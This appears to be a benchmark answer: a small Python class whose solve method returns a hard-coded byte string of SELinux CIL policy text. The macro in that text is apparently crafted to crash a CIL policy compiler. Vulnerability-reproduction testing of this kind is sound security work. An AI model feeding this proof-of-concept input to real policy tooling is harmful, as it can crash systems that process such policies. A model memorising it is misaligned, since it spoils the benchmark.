class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'(cil16(class process(transition))(macro mymacro((cp classpermission))(classpermissionset myset $cp))(mymacro(process(transition))))'
        return poc